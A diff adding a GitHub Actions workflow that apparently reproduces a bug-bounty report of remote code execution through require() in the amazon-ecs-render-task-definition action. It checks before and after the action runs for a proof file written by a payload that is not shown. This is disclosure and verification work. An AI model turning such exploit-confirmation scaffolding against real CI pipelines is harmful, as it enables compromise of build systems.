@@ -1,0 +1,36 @@
+name: h1-3927165-repro
+on:
+  push:
+    branches: [main]
+  workflow_dispatch: {}
+
+jobs:
+  render:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: pre-check (payload not run yet)
+        run: |
+          echo "workspace listing before action:"
+          ls -la
+          test -f RCE_PROOF && { echo "FAIL: RCE_PROOF already present before action ran"; exit 1; } || echo "ok, no proof file yet"
+
+      - name: run vulnerable action (aws-actions/amazon-ecs-render-task-definition@v1)
+        uses: aws-actions/amazon-ecs-render-task-definition@v1
+        with:
+          task-definition: task-definition.json
+          container-name: web
+          image: example:latest
+
+      - name: post-check (require() executed our payload)
+        run: |
+          echo "workspace listing after action:"
+          ls -la
+          if [ -f RCE_PROOF ]; then
+            echo "RCE CONFIRMED: RCE_PROOF written by payload loaded via require()"
+            cat RCE_PROOF
+          else
+            echo "RCE_PROOF missing, exploit did not fire"
+            exit 1
+          fi
